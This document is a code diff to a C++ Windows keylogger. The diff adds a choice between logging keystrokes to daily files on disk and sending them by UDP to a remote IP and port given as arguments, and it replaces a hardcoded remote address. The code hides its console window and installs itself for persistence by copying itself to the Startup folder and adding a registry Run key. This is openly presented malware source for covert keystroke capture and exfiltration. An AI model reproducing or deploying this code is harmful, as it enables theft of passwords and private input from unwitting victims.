@@ -1,5 +1,4 @@
-/**
-*				             keyloger
+/**				             keyloger
 *
 *This software only can run in windows,built it by Visual Studio.
 *
@@ -9,31 +8,41 @@
 **/
 #define _CRT_SECURE_NO_WARNINGS
 #include <Shlobj.h>
-#include <windows.h>
+#include <ObjIdl.h>
 #include <stdio.h>
+#include <windows.h>
 #include <time.h>
 #include <iostream>
+#include <fstream>
 #include <string>
-#include <ObjIdl.h>
+
 
 using namespace std;
-
-//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 #pragma comment(lib,"ws2_32.lib")
+#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 
-#define REMOTE_IP	"10.21.89.125"
-#define UDP_PORT	12345
-#define	NEED_SAVE_BPM	0
-#define NEED_SEND_UDP	1
+
+static std::string logpath("D:\\keylogger");
+static int	port = 22345;
+static std::string ipaddr("127.0.0.1");
+static int	appflag = 0;// local
 
 //用法
-void static usage(const std::string& AppName)
+void static usage()
 {
-	cout << AppName.c_str() << "    "
-		 << "[ipaddr]=127.0.0.1" << "    "
-		 << "[port]=12345" << "    "
-		 << "[bufsize]=512"
-		 << std::endl;
+			 cout <<"keylogger [flag = local]([ip = 127.0.0.1][port = 22345] | [logpath = D:/ keylogger / ])" << endl
+				 << endl
+				 << "flag :" << endl
+				 << "      local   meaning it's local host,next param is the logpath." << endl
+				 << "      remote  meaning it's will send msmg to remote host,next param is ipaddr. and port of recv. server." << endl
+				 << "      ...     it's not support this option" << endl
+				 << "ip :" << endl
+				 << "               it support IPV4, but the flag must `remote`" << endl
+				 << "port :" << endl
+				 << "                the UDP port of remote recv.server" << endl
+				 << "logpath :" << endl
+				 << "                 when the flag is local, logpath configure to write log." << endl
+				 << endl;
 }
 
 //用于记录结果的函数
@@ -66,16 +75,51 @@ struct pkg_header
 	short length;//消息长度
 };
 
+void write_log(const std::string& text)
+{
+	time_t t = time(NULL);
+	tm * mtm = localtime(&t);
+	char cur_day[20] = { 0 };
+	sprintf(cur_day, "%04d-%02d-%02d", mtm->tm_year+1900, mtm->tm_mon, mtm->tm_mday);
+	std::string logfile = logpath + "\\" + std::string(cur_day) + ".log";
+	ofstream of(logfile.c_str(), ios::app);
+	if (of.good())
+	{
+		of << text;
+	}
+	of.close();
+}
+
 int main(int argc, char** argv)
 {
-	//FreeConsole();
-	//单利运行
+	FreeConsole();
 	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, ("keyloger@nyhoo"));
 	if (GetLastError() == ERROR_ALREADY_EXISTS)
 	{
 		return -1;
 	}
-	usage(argv[0]);
+	if (argc >= 2)
+	{
+		appflag = std::string("local") == std::string(argv[1]) ? 0 : 1;
+		if (appflag)
+		{
+			if (argc >= 3)
+			{
+				ipaddr = std::string(argv[2]);
+				if (argc >= 4)
+				{
+					port = atol(argv[3]);
+				}
+			}
+		}
+		else
+		{
+			if (argc >= 3)
+			{
+				logpath = std::string(argv[2]);
+			}
+		}
+	}
 	HANDLE handle = GetCurrentProcess();
 	HWND hwnd = GetConsoleWindow();
 	install(hwnd);
@@ -166,15 +210,15 @@ void install(HWND h)
 	SHGetFolderPathA(h, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, start_path);
 	GetModuleFileNameA(NULL, exeName, MAX_PATH);
 	std::string exe_str(exeName);
-	exe_str = exe_str.substr(exe_str.find_last_of("\\"));
+	exe_str = exe_str.substr(exe_str.find_last_of("\\/"));
 	std::string fileName(exe_str.substr(1));
 	strcat(start_path, exe_str.c_str());
 	//拷贝到启动目录
 	CopyFileA(exeName, start_path, false);
 	//设置为隐藏文件
-	SetFileAttributesA(start_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+	//SetFileAttributesA(start_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 	//设置快捷方式
-	create_shortcut(start_path, "", OLESTR("D:\\mskl.lnk"), "");
+	//create_shortcut(start_path, "", OLESTR("D:\\keylogger.lnk"), "");
 	//修改注册表
 	HKEY hKey;
 	RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL);
@@ -401,8 +445,15 @@ int key_log(UINT keyCode, const char* keyText, UINT len)
 	}
 	else
 	{
-		string s = packet_data(strbuf.c_str(), strbuf.length(), 1, 0);
-		send_udp((char*)REMOTE_IP, UDP_PORT, (char*)s.data(), s.size());
+		if (appflag)
+		{
+			string s = packet_data(strbuf.c_str(), strbuf.length(), 1, 0);
+			send_udp((char*)ipaddr.c_str(), port, (char*)s.data(), s.size());
+		}
+		else
+		{
+			write_log(strbuf);
+		}
 		strbuf = "";
 		if (title_change)
 		{
